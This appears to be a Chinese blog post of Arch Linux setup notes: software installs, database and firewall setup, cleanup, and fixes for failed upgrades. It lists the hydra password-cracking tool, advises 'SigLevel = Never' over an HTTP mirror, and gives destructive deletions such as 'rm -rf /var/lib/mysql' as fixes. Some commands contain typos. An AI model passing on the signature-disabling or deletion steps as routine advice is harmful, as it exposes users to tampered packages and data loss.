<h3 id="启动器"><a href="#启动器" class="headerlink" title="启动器"></a>启动器</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yay -S utools</span><br><span class="line">pacman -S latte-dock</span><br></pre></td></tr></table></figure>



<h3 id="同步软件"><a href="#同步软件" class="headerlink" title="同步软件"></a>同步软件</h3><p>微力同步：<a href="http://www.verysync.com/">http://www.verysync.com/</a></p>
<p>Onedrive上传工具：<a href="https://www.moerats.com/archives/1006/">https://www.moerats.com/archives/1006/</a></p>
<h3 id="密码保存"><a href="#密码保存" class="headerlink" title="密码保存"></a>密码保存</h3><p>Enpass: <a href="https://www.enpass.io/">https://www.enpass.io/</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S enpass-bin</span><br></pre></td></tr></table></figure>



<h3 id="远程终端连接"><a href="#远程终端连接" class="headerlink" title="远程终端连接"></a>远程终端连接</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yaourt -S asbru-cm-git</span><br><span class="line">yay -S termius</span><br><span class="line">pacman -S putty</span><br><span class="line"></span><br><span class="line">wget www.hostbuf.com/downloads/finalshell_install_linux.sh</span><br></pre></td></tr></table></figure>





<h3 id="其他软件"><a href="#其他软件" class="headerlink" title="其他软件"></a>其他软件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">wxHexEditor</span></span><br><span class="line">pacman -S wxhexeditor</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">sublime</span></span><br><span class="line">yay -S sublime-text-dev</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">vscode</span></span><br><span class="line">yay -S vistual-studio-code-bin</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ftp</span></span><br><span class="line">pacman -S filezilla</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">git可视化管理工具</span></span><br><span class="line">pacman -S gitkraken</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">GrubCustomizer</span></span><br><span class="line">pacman -S grub-customizer</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">KDE 分区管理器</span></span><br><span class="line">pacman -S partitionmanager</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">steam</span></span><br><span class="line">pacman -S lib32-nvidia-utils steam</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">nc</span></span><br><span class="line">pacman -S gnu-netcat</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">gem</span></span><br><span class="line">pacman -S rubygems</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">密码爆破工具(需要安装mariadb)</span></span><br><span class="line">pacman -S hydra</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">mathpix <span class="comment"># https://mathpix.com/</span></span></span><br><span class="line">yay -S mathpix-snipping-tool</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">DBeaver 数据库可视化管理工具</span></span><br><span class="line">pacman -S dbeaver</span><br><span class="line"></span><br><span class="line">gem sources --remove https://rubygems.org/</span><br><span class="line">gem sources -a http://gems.ruby-china.com/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">screenkey</span></span><br><span class="line">pacman -S screenkey</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S flameshot # 截图工具</span><br><span class="line">flameshot gui # 启动截图</span><br><span class="line">pacman -S spectacle # 截图工具，可延时截图</span><br><span class="line">pacman -S deepin-screenshot # 深度截图工具</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">peek # GIF录制工具</span><br><span class="line">kolourpaint # 画图软件</span><br><span class="line">zeal # API 帮助文档</span><br><span class="line">kchmviewer # chm文档查看器</span><br><span class="line">gitnote # 笔记</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S fsearch-git # 文件搜索（类似everything）</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200306160654856.png" alt="fsearch" style="zoom:50%;" />



<h4 id="usb控制手机"><a href="#usb控制手机" class="headerlink" title="usb控制手机"></a>usb控制手机</h4><blockquote>
<p><a href="https://www.iplaysoft.com/scrcpy.html">https://www.iplaysoft.com/scrcpy.html</a></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yay -S scrcpy</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>Scrcpy 的命令参数</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td><strong>关闭手机屏幕</strong></td>
<td><code>scrcpy -S</code></td>
</tr>
<tr>
<td><strong>限制画面分辨率</strong></td>
<td><code>scrcpy -m 1024</code> (比如限制为 1024)</td>
</tr>
<tr>
<td><strong>修改视频码率</strong></td>
<td><code>scrcpy -b 4M</code> (默认 8Mbps，改成 4Mbps)</td>
</tr>
<tr>
<td><strong>裁剪画面</strong></td>
<td><code>scrcpy -c 1224:1440:0:0</code> 表示分辨率 1224x1440 并且偏移坐标为 (0,0)</td>
</tr>
<tr>
<td><strong>多设备切换</strong></td>
<td><code>scrcpy -s 设备ID</code> (使用 <code>adb devices</code> 命令查看设备ID)</td>
</tr>
<tr>
<td><strong>窗口置顶</strong></td>
<td><code>scrcpy -T</code></td>
</tr>
<tr>
<td><strong>显示触摸点击</strong></td>
<td><code>scrcpy -t</code> 在演示或录制教程时，可在画面上对应显示出点击动作</td>
</tr>
<tr>
<td><strong>全屏显示</strong></td>
<td><code>scrcpy -f</code></td>
</tr>
<tr>
<td><strong>文件传输默认路径</strong></td>
<td><code>scrcpy --push-target /你的/目录</code> 将文件拖放到 scrcpy 可以传输文件，此命令指定默认保存目录</td>
</tr>
<tr>
<td><strong>只读模式(仅显示不控制)</strong></td>
<td><code>scrcpy -n</code></td>
</tr>
<tr>
<td><strong>屏幕录像</strong></td>
<td><code>scrcpy -r 视频文件名.mp4</code> 或 <code>.mkv</code></td>
</tr>
<tr>
<td><strong>屏幕录像 (禁用电脑显示)</strong></td>
<td><code>scrcpy -Nr 文件名.mkv</code></td>
</tr>
<tr>
<td><strong>设置窗口标题</strong></td>
<td><code>scrcpy --window-title &#39;异次元好棒！&#39;</code></td>
</tr>
<tr>
<td><strong>同步传输声音</strong></td>
<td>可借助 <a href="https://github.com/rom1v/usbaudio">USBaudio</a> 这个开源项目实现，但仅支持 <a href="https://www.iplaysoft.com/os/linux-platform">Linux</a> 系统</td>
</tr>
</tbody></table>
<h4 id="使用-WIFi-连接手机"><a href="#使用-WIFi-连接手机" class="headerlink" title="使用 WIFi 连接手机"></a>使用 WIFi 连接手机</h4><p>Scrcpy 使用 adb 与 Android 设备通讯，而 adb 本身是支持无线连接的。因此除了 USB 数据线之外，我们也能无线使用。前提是需要保证手机和电脑处于同一<a href="https://www.iplaysoft.com/tag/%E5%B1%80%E5%9F%9F%E7%BD%91">局域网</a> (连接到相同的 <a href="https://www.iplaysoft.com/tag/wifi">WiFi</a> 路由器)，步骤如下：</p>
<ol>
<li>查询设备当前的 IP 地址 (设置 →关于手机→状态)</li>
<li>启用 adb TCP&#x2F;IP 连接，执行命令：<code>adb tcpip 5555</code>，其中 5555 为端口号</li>
<li>拔掉你的数据线</li>
<li>通过 WiFi 进行连接，执行命令：<code>adb connect 设备IP地址:5555</code></li>
<li>重新启动 scrcpy 即可</li>
<li>如果 WiFi 较慢，可以调整码率：<code>scrcpy -b 3M -m 800</code>，意思是限制 3 Mbps，画面分辨率限制 800，数值可以随意调整。</li>
<li>如需切换回 USB 模式，执行：<code>adb usb</code></li>
</ol>
<p><strong>dwm</strong></p>
<p>安装编译环境及依赖包：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S base-devel gcc make xorg xorg-xinit xorg-server xorg-apps </span><br></pre></td></tr></table></figure>

<p>安装dwm：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://git.suckless.org/dwm</span><br></pre></td></tr></table></figure>

<p>安装st：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://git.suckless.org/st</span><br><span class="line"></span><br><span class="line">wget https://st.suckless.org/patches/alpha/st-alpha-0.8.2.diff</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打补丁：</span></span><br><span class="line">patch &lt; st-alpha-0.8.2.diff</span><br></pre></td></tr></table></figure>

<p>配置启动文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;exec dwm&quot; &gt; ~/.xinitrc</span><br></pre></td></tr></table></figure>

<p><strong>桌面壁纸</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S feh</span><br><span class="line">echo &quot;exec feh --bg-scale ./bg.jpg&quot; &gt;&gt; ~/.xinitrc</span><br></pre></td></tr></table></figure>



<h2 id="开发环境安装"><a href="#开发环境安装" class="headerlink" title="开发环境安装"></a>开发环境安装</h2><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><blockquote>
<p><a href="https://wiki.archlinux.org/index.php/Java_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">JDK</a> </p>
</blockquote>
<p>JDK与OpenJDK不同，OpenJDK源代码不完整，且不包含部署功能，只包含最精简的JDK，</p>
<p>Oracle官网下载：</p>
<p>Java SE Development Kit 8u241: <a href="https://www.oracle.com/java/technologies/javase-jdk8-downloads.html">https://www.oracle.com/java/technologies/javase-jdk8-downloads.html</a></p>
<p>配置环境：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/profile</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">根据解压的目录修改添加</span></span><br><span class="line">export JAVA_HOME=/[path]/jdk1.8.0_241</span><br><span class="line">export JRE_HOME=$JAVA_HOME/jre</span><br><span class="line">export CLASSPATH=.:$JAVA_HOME/lib:$JRE_HOME/lib:$CLASSPATH</span><br><span class="line">export PATH=$JAVA_HOME/bin:$JRE_HOME/bin:$PATH</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置字体反锯齿</span></span><br><span class="line">export _JAVA_OPTIONS=&#x27;-Dawt.useSystemAAFontSettings=lcd&#x27;</span><br></pre></td></tr></table></figure>



<blockquote>
<p><a href="https://wiki.archlinux.org/index.php/Eclipse_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">Eclipse</a></p>
</blockquote>
<h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -S mysql</span><br></pre></td></tr></table></figure>

<p>根据提示进行初始化操作：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200309122605908.png" alt="image-20200309122605908"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo mysqld --initialize --user=mysql --basedir=/usr --datadir=/var/lib/mysql</span><br></pre></td></tr></table></figure>

<p>得到临时密码</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200309122832930.png" alt="image-20200309122832930"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl start mysqld # 启动MySQL服务</span><br><span class="line">mysql_secure_installation</span><br></pre></td></tr></table></figure>



<h3 id="Mariadb"><a href="#Mariadb" class="headerlink" title="Mariadb"></a>Mariadb</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -S mariadb</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200328172207737.png" alt="image-20200328172207737"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo mariadb-install-db --user=mysql --basedir=/usr --datadir=/var/lib/mysql</span><br><span class="line">sudo systemctl start mysqld.service # 启动服务</span><br><span class="line">sudo mysql_secure_installation</span><br></pre></td></tr></table></figure>

<h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可视化管理工具</span></span><br><span class="line">pacman -S redis-desktop-manager</span><br></pre></td></tr></table></figure>



<h3 id="PHP-Apache"><a href="#PHP-Apache" class="headerlink" title="PHP&amp;Apache"></a>PHP&amp;Apache</h3><blockquote>
<p><a href="https://wiki.archlinux.org/index.php/Apache_HTTP_Server_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">https://wiki.archlinux.org/index.php/Apache_HTTP_Server_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)</a></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S httpd php php-apache</span><br><span class="line">yay -S phpstorm # 最好自己去官网下载安装</span><br></pre></td></tr></table></figure>



<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S python</span><br><span class="line">pacman -S pycharm # 最好自己去官网下载安装</span><br></pre></td></tr></table></figure>



<h2 id="系统备份"><a href="#系统备份" class="headerlink" title="系统备份"></a>系统备份</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S timeshift</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a href="https://www.jianshu.com/p/b03a51c682a5">https://www.jianshu.com/p/b03a51c682a5</a></p>
</blockquote>
<h2 id="系统软件"><a href="#系统软件" class="headerlink" title="系统软件"></a>系统软件</h2><h3 id="防病毒-无必要"><a href="#防病毒-无必要" class="headerlink" title="防病毒(无必要)"></a>防病毒(无必要)</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S clamav clamtk</span><br><span class="line"></span><br><span class="line">sudo freshclam # 更新病毒库</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">## 更新速度太慢,手动下载 ###</span></span></span><br><span class="line">http://database.clamav.net/main.cvd</span><br><span class="line">http://database.clamav.net/daily.cvd</span><br><span class="line">http://database.clamav.net/bytecode.cvd</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">拷贝到 /var/lib/clamav 目录下</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">##</span></span></span><br><span class="line"></span><br><span class="line">sudo systemctl start clamav-daemon</span><br><span class="line">sudo systemctl enable clamav-daemon # 开启自动更新病毒库</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进行扫描</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">clamscan myfile</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">clamscan -r -i /home</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">clamscan -r -i --exclude-dir=<span class="string">&#x27;^/sys|^/proc|^/dev|^/lib|^/bin|^/sbin&#x27;</span> /</span></span><br></pre></td></tr></table></figure>

<h3 id="优化管理"><a href="#优化管理" class="headerlink" title="优化管理"></a>优化管理</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yay -S stacer</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200311125032644.png" alt="image-20200311125032644" style="zoom:50%;" />

<h3 id="常用防火墙配置"><a href="#常用防火墙配置" class="headerlink" title="常用防火墙配置"></a>常用防火墙配置</h3><blockquote>
<p><a href="https://www.cnblogs.com/gavinpan/p/11220474.html">https://www.cnblogs.com/gavinpan/p/11220474.html</a></p>
<p><a href="https://wiki.archlinux.org/index.php/Iptables_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">https://wiki.archlinux.org/index.php/Iptables_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)</a></p>
</blockquote>
<p><strong>IPv4 防火墙</strong>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl enable iptables</span><br><span class="line">systemctl start iptables</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT #允许本地回环接口(即运行本机访问本机)</span><br><span class="line">iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT #允许已建立的或相关连的通行</span><br><span class="line">iptables -A OUTPUT -j ACCEPT #允许所有本机向外的访问</span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT #允许访问22端口</span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -j ACCEPT #允许访问80端口</span><br><span class="line">iptables -A INPUT -j REJECT    #禁止其他未允许的规则访问</span><br><span class="line">iptables -A FORWARD -j REJECT  #禁止其他未允许的规则访问</span><br><span class="line"></span><br><span class="line">iptables-save &gt; /etc/iptables/iptables.rules #保存配置</span><br></pre></td></tr></table></figure>

<p><strong>IPv6 防火墙</strong>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl start ip6tables</span><br><span class="line">systemctl enable ip6tables</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip6tables -A INPUT -s ::1 -d ::1 -j ACCEPT</span><br><span class="line">ip6tables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT </span><br><span class="line">ip6tables -A INPUT -p ipv6-icmp -j ACCEPT </span><br><span class="line">ip6tables -A OUTPUT -j ACCEPT</span><br><span class="line">ip6tables -A INPUT -j REJECT</span><br><span class="line">ip6tables -A FORWARD -j REJECT</span><br><span class="line"></span><br><span class="line">ip6tables-save &gt; /etc/iptables/ip6tables.rules #保存配置</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>ip6tables -A INPUT -p ipv6-icmp -j ACCEPT</code> </p>
<p>只有IPv6 icmp数据包可以经过网络传输时，SLAAC才可以正常工作。所以在要配置IPv6的计算机上，<strong>必须</strong>修改防火墙，允许ipv6-icmp数据包进入。</p>
</blockquote>
<h2 id="bash-优化"><a href="#bash-优化" class="headerlink" title="bash 优化"></a>bash 优化</h2><ul>
<li>zsh + <a href="https://github.com/romkatv/powerlevel10k">powerlevel10k</a></li>
</ul>
<h2 id="垃圾清理"><a href="#垃圾清理" class="headerlink" title="垃圾清理"></a>垃圾清理</h2><blockquote>
<p><a href="https://blog.csdn.net/weixin_43968923/article/details/88768951">https://blog.csdn.net/weixin_43968923/article/details/88768951</a></p>
<p><a href="https://www.cnblogs.com/archer-yjun/p/11013306.html">https://www.cnblogs.com/archer-yjun/p/11013306.html</a></p>
</blockquote>
<p>清理系统中无用的包：(尽量保留 linux linux-headers 等重要软件包以防滚崩)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -R $(pacman -Qdtq)</span><br></pre></td></tr></table></figure>

<p>清除已下载的安装包</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -Scc</span><br></pre></td></tr></table></figure>

<p>查看日志文件大小：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo journalctl --disk-usage</span><br></pre></td></tr></table></figure>

<p>删除指定大小的日志文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo journalctl --vacuum-size=50M</span><br></pre></td></tr></table></figure>

<p>删除崩溃日志：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo rm /var/lib/systemd/coredump/*</span><br></pre></td></tr></table></figure>



<h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><h3 id="invalid-or-corrupted-package-PGP-signature"><a href="#invalid-or-corrupted-package-PGP-signature" class="headerlink" title="invalid or corrupted package (PGP signature))"></a>invalid or corrupted package (PGP signature))</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/pacman.conf</span><br><span class="line"></span><br><span class="line">修改或添加:</span><br><span class="line">[archlinuxcn]</span><br><span class="line">SigLevel = Never  # ***</span><br><span class="line">Server = http://mirrors.163.com/archlinux-cn/$arch</span><br></pre></td></tr></table></figure>

<h3 id="更新系统内核后无法进入系统"><a href="#更新系统内核后无法进入系统" class="headerlink" title="更新系统内核后无法进入系统"></a>更新系统内核后无法进入系统</h3><blockquote>
<p>情况：upgrad linux (5.5.7.arch1-1 -&gt; 5.5.8.arch1-1)</p>
<p>时间：2020-03-08</p>
</blockquote>
<p>引导后提示：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Loading Linux linux ...</span><br><span class="line">error: premature end of file /vmlinuz-linux.</span><br><span class="line">Loading initial ramdisk ...</span><br><span class="line">error: you need to load the kernel first.</span><br><span class="line"></span><br><span class="line">Press any key to continue...</span><br></pre></td></tr></table></figure>

<p>解决方案：</p>
<p>进LiveCD，挂载 <code>/</code> 和 <code>/boot</code> </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arch-chroot /mnt # 进入系统</span><br></pre></td></tr></table></figure>

<p>切换内核到LTS版本（临时）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S linux-lts linux-lts-headers</span><br></pre></td></tr></table></figure>

<p>安装完成后，重启进入 grub 引导时按 e 进行编辑</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">原为 linux /vmlinuz-linux</span></span><br><span class="line">linux /vmlinuz-linux-lts</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">原为 initrd /initramfs-linux.img</span></span><br><span class="line">initrd /initramfs-linux-lts.img</span><br></pre></td></tr></table></figure>

<p>F10 进入即可，</p>
<p>进入系统后发现独立显卡驱动无法正常工作，LiveCD 中尝试卸载当前内核发现：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">:: removing linux breaks dependency &#x27;linux&#x27; required by bbswitch</span><br><span class="line">:: removing linux breaks dependency &#x27;linux&#x27; required by nvidia</span><br></pre></td></tr></table></figure>

<h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>卸载当前系列的包，重新安装最新版本：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -R bbswitch nvidia</span><br><span class="line">pacman -R linux</span><br><span class="line">pacman -S linux</span><br><span class="line">pacman -S nvidia bbswitch</span><br></pre></td></tr></table></figure>

<p>重启即可</p>
<p><strong>安装有NVIDIA驱动的可以在更新前先卸载，更新完内核后重新安装即可避免更新后出现上述情况</strong></p>
<blockquote>
<p>该方法于2020-03-15更新时有效</p>
<p>upgraded linux (5.5.8.arch1-1 -&gt; 5.5.9.arch1-2)</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -R bbswitch nvidia</span><br><span class="line">sudo pacman -Syu</span><br><span class="line">sudo pacman -S nvidia bbswitch</span><br></pre></td></tr></table></figure>



<h3 id="日常更新之更新出错"><a href="#日常更新之更新出错" class="headerlink" title="日常更新之更新出错"></a>日常更新之更新出错</h3><blockquote>
<p>发生时间：2020-05-05</p>
</blockquote>
<p>出现的问题：</p>
<p><code>pacman</code> 更新失败、同时 linux 内核更新失败，<code>pacman</code> 丢失无法使用，重启后无法进入系统（无内核）</p>
<p>更新日志：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[2020-05-05T08:54:19+0800] [PACMAN] Running &#x27;pacman -Su&#x27;</span><br><span class="line">[2020-05-05T08:54:19+0800] [PACMAN] starting full system upgrade</span><br><span class="line">[2020-05-05T08:54:35+0800] [ALPM] running &#x27;60-mkinitcpio-remove.hook&#x27;...</span><br><span class="line">[2020-05-05T08:54:35+0800] [ALPM] running &#x27;70-dkms-remove.hook&#x27;...</span><br><span class="line">[2020-05-05T08:54:35+0800] [ALPM] transaction started</span><br><span class="line">[2020-05-05T08:54:35+0800] [ALPM] upgraded ca-certificates-mozilla (3.51.1-1 -&gt; 3.52-1)</span><br><span class="line">[2020-05-05T08:54:35+0800] [ALPM] upgraded libtool (2.4.6+42+gb88cebd5-11 -&gt; 2.4.6+42+gb88cebd5-12)</span><br><span class="line">[2020-05-05T08:54:35+0800] [ALPM] upgraded ipython (7.13.0-1 -&gt; 7.14.0-2)</span><br><span class="line">[2020-05-05T08:54:35+0800] [ALPM] upgraded nss (3.51.1-1 -&gt; 3.52-1)</span><br><span class="line">[2020-05-05T08:54:35+0800] [ALPM] upgraded lib32-nss (3.51.1-1 -&gt; 3.52-1)</span><br><span class="line">[2020-05-05T08:54:35+0800] [ALPM] upgraded libmicrohttpd (0.9.70-1 -&gt; 0.9.70-2)</span><br><span class="line">[2020-05-05T08:54:36+0800] [ALPM] upgraded linux (5.6.8.arch1-1 -&gt; 5.6.10.arch1-1)</span><br><span class="line">[2020-05-05T08:54:39+0800] [ALPM] upgraded linux-headers (5.6.8.arch1-1 -&gt; 5.6.10.arch1-1)</span><br><span class="line">[2020-05-05T08:54:39+0800] [ALPM] upgraded linux-lts (5.4.36-1 -&gt; 5.4.38-1)</span><br><span class="line">[2020-05-05T08:54:41+0800] [ALPM] upgraded linux-lts-headers (5.4.36-1 -&gt; 5.4.38-1)</span><br><span class="line">[2020-05-05T08:54:41+0800] [ALPM] transaction failed</span><br></pre></td></tr></table></figure>

<p>猜测发生原因：更新了<code>pacman</code> ，而保存软件包的 <code>/var/cache/pacman/pkg</code> 文件夹被我之前整成软连接了，可能在此次更新过程中被当莫名删掉了，然后就找不到下载的安装包，导致后来的内核、pacman都安装失败（然而都已经卸载了。。。）</p>
<h4 id="解决途径："><a href="#解决途径：" class="headerlink" title="解决途径："></a>解决途径：</h4><p>回到 Arch 安装盘，挂载分区和引导之后重新安装内核：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacstrap /mnt linux </span><br></pre></td></tr></table></figure>

<p>删除 <code>/var/lib/pacman/local/pacman-5.2.1-5</code> 文件夹，然后再安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacstarp /mnt pacman</span><br></pre></td></tr></table></figure>



<h3 id="回滚操作"><a href="#回滚操作" class="headerlink" title="回滚操作"></a>回滚操作</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装包缓存位置：</span></span><br><span class="line">cd /var/cache/pacman/pkg</span><br><span class="line"></span><br><span class="line">pacman -S downgrade</span><br><span class="line"></span><br><span class="line">downgrade 软件名</span><br></pre></td></tr></table></figure>



<h3 id="卸载MySQL更换Mariadb"><a href="#卸载MySQL更换Mariadb" class="headerlink" title="卸载MySQL更换Mariadb"></a>卸载MySQL更换Mariadb</h3><p>执行 <code>sudo mariadb-install-db --user=mysql --basedir=/usr --datadir=/var/lib/mysql</code> 时报错：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Installing MariaDB/MySQL system tables in &#x27;/var/lib/mysql&#x27; ...</span><br><span class="line">2020-03-28 17:24:00 0 [ERROR] InnoDB: Invalid flags 0x4800 in ./ibdata1</span><br><span class="line">2020-03-28 17:24:00 0 [ERROR] InnoDB: Plugin initialization aborted with error Data structure corruption</span><br><span class="line">2020-03-28 17:24:01 0 [ERROR] Plugin &#x27;InnoDB&#x27; init function returned error.</span><br><span class="line">2020-03-28 17:24:01 0 [ERROR] Plugin &#x27;InnoDB&#x27; registration as a STORAGE ENGINE failed.</span><br><span class="line">2020-03-28 17:24:01 0 [ERROR] Unknown/unsupported storage engine: InnoDB</span><br><span class="line">2020-03-28 17:24:01 0 [ERROR] Aborting</span><br><span class="line"></span><br><span class="line">Installation of system tables failed!  Examine the logs in</span><br><span class="line">/var/lib/mysql for more information.</span><br></pre></td></tr></table></figure>

<p>解决方法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo rm -rf /var/lib/mysql</span><br></pre></td></tr></table></figure>



<h3 id="plasma桌面特效失效"><a href="#plasma桌面特效失效" class="headerlink" title="plasma桌面特效失效"></a>plasma桌面特效失效</h3><p>一次开机突然所有的桌面特效失效了，包括透明效果、动画等等</p>
<blockquote>
<p><a href="https://blog.csdn.net/u011054333/article/details/53653506">https://blog.csdn.net/u011054333/article/details/53653506</a></p>
</blockquote>
<p>解决方法：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200331082850039.png" alt="进入设置-显示与监控"></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200331082903245.png" alt="进入混成器设置"></p>
<p>重新选择渲染后端后应用即可解决。</p>
<h3 id="pacman-报错"><a href="#pacman-报错" class="headerlink" title="pacman 报错"></a>pacman 报错</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">:: 正在同步软件包数据库...</span><br><span class="line">错误：无法升级 core (无法锁定数据库)</span><br><span class="line">错误：无法升级 extra (无法锁定数据库)</span><br><span class="line">错误：无法升级 community (无法锁定数据库)</span><br><span class="line">错误：无法升级 multilib (无法锁定数据库)</span><br><span class="line">错误：无法升级 archlinuxcn (无法锁定数据库)</span><br></pre></td></tr></table></figure>

<p>解决方法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo rm  /var/lib/pacman/db.lck</span><br></pre></td></tr></table></figure>



